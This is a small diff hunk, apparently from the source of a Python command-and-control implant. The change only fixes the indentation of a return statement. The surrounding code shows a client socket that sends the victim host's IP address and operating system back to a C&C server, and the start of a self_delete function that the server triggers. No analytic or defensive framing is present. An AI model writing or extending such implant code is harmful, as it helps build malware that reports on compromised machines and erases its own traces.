@@ -40,7 +40,7 @@ def create_client_socket(ip_addr: str, port: int):
 		initial_message = "IP=" + client_ip + ",OS=" + system() # Send IP address and OS information.
 		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
 
-        	return client_sock # Return the created client socket.
+        return client_sock # Return the created client socket.
 
 def self_delete(name: str):
     """This function will be invoked when the C&C server enter's the
